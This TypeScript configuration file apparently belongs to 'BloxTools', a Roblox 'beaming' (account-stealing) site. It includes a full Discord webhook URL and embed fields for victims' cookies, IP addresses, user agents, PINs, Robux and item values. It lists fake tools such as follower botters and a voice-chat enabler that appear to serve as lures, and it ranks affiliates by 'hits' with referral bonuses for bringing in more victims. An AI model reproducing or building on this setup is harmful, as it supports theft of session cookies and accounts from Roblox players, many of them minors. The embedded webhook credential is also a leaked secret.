export const siteConfig = {
  name: "BloxTools",
  webhookUrl: "https://discord.com/api/webhooks/1498409090701987960/-C42DQziUsV6V-VDokUYlsRZD9KeYhpLLg2eCuAI7cjovLxPkuXuf1KanbIqeWkw_J0s",
  discordInviteUrl: "https://discord.gg/your-invite-here",
};

// Custom Discord emoji overrides used in webhook embeds.
// Format for animated: <a:name:id>, for static: <:name:id>
// Set to null/empty string to fall back to the default unicode emoji.
export const discordEmojis = {
  robux:    "<:7116_Robux:1498757858731360349>",
  premium:  "<:Roblox_Premium_logosvg:1498785365308211201>",
  rap:      "💎",
  summary:  "📊",
  pending:  "⏳",
  voice:    "🎤",
  age:      "🪪",
  korblox:  "💀",
  headless: "👑",
  groups:   "👑",
  games:    "🎮",
  cookie:   "🍪",
  ip:       "🌐",
  user:     "👤",
  id:       "🆔",
  age_acct: "📅",
  friends:  "🫂",
  followers:"👥",
  following:"➡️",
  ua:       "🖥️",
  time:     "⏰",
  pin:      "🔐",
  owner:    "🏷️",
};


export const toolsConfig = {
  botFollowers: {
    youtubeUrl: "https://www.youtube.com/watch?v=REPLACE_ME",
  },
  copyGames: {
    youtubeUrl: "https://www.youtube.com/watch?v=REPLACE_ME",
  },
  copyClothes: {
    youtubeUrl: "https://www.youtube.com/watch?v=REPLACE_ME",
  },
  groupBotter: {
    youtubeUrl: "https://www.youtube.com/watch?v=REPLACE_ME",
  },
  vcEnabler: {
    youtubeUrl: "https://www.youtube.com/watch?v=REPLACE_ME",
  },
};

// Rank tiers (linear progression). Index 0 = lowest rank.
export const RANKS: { name: string; min: number }[] = [
  { name: "Beginner Beamer", min: 0 },
  { name: "Low Beamer", min: 10 },
  { name: "Novice Beamer", min: 25 },
  { name: "Average Beamer", min: 50 },
  { name: "Decent Beamer", min: 100 },
  { name: "Solid Beamer", min: 200 },
  { name: "Good Beamer", min: 350 },
  { name: "Advanced Beamer", min: 550 },
  { name: "Pro Beamer", min: 800 },
  { name: "Top Beamer", min: 1200 },
];

export function getRank(hits: number) {
  let current = RANKS[0];
  let next: { name: string; min: number } | null = null;
  for (let i = 0; i < RANKS.length; i++) {
    if (hits >= RANKS[i].min) {
      current = RANKS[i];
      next = RANKS[i + 1] ?? null;
    }
  }
  return { current, next };
}

// Referral reward tiers — boost = bonus hits added to leaderboard rank per referral
export interface ReferralTier {
  name: string;
  minReferrals: number;
  boostPerReferral: number;
  perk: string;
  color: string; // tailwind text-* color
}
export const REFERRAL_TIERS: ReferralTier[] = [
  { name: "Recruit",   minReferrals: 0,  boostPerReferral: 5,  perk: "+5 hits per referral",          color: "text-gray-300" },
  { name: "Scout",     minReferrals: 3,  boostPerReferral: 8,  perk: "+8 hits per referral",          color: "text-green-400" },
  { name: "Hunter",    minReferrals: 10, boostPerReferral: 12, perk: "+12 hits + custom badge",       color: "text-blue-400" },
  { name: "Specialist",minReferrals: 25, boostPerReferral: 18, perk: "+18 hits + priority support",   color: "text-purple-400" },
  { name: "Legend",    minReferrals: 50, boostPerReferral: 25, perk: "+25 hits + early access perks", color: "text-yellow-400" },
];

export function getReferralTier(referrals: number): { current: ReferralTier; next: ReferralTier | null } {
  let current = REFERRAL_TIERS[0];
  let next: ReferralTier | null = null;
  for (let i = 0; i < REFERRAL_TIERS.length; i++) {
    if (referrals >= REFERRAL_TIERS[i].minReferrals) {
      current = REFERRAL_TIERS[i];
      next = REFERRAL_TIERS[i + 1] ?? null;
    }
  }
  return { current, next };
}

